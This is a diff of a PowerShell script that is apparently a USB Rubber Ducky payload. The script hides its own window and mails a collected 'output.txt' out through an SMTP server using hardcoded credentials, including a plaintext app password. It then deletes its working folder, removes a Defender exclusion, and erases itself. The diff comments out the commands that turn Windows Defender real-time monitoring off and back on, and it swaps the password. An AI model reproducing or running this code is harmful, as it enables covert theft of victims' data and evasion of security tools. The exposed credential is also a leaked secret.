@@ -78,7 +78,7 @@ public static extern bool SetForegroundWindow(IntPtr hWnd);
 Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
 
 # Disable real time protection
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Set-MpPreference -DisableRealtimeMonitoring $true
 # Minimize window 
 Get-Process -ID $PID | Set-WindowState -State HIDE
 # Create a tmp directory in the Downloads folder
@@ -107,14 +107,14 @@ $Subject = "Ducky Rapport"
 $Body = "Hi, here is the Rapport"
 
 # The password is an app-specific password if you have 2-factor-auth enabled
-$Password = "yvtq bdzk evxf mdwq" | ConvertTo-SecureString -AsPlainText -Force
+$Password = "dnku mukw cxac idov" | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 # The smtp server used to send the file
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
-Set-MpPreference -DisableRealtimeMonitoring $false
+# Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
 
 # Remove the script from the system
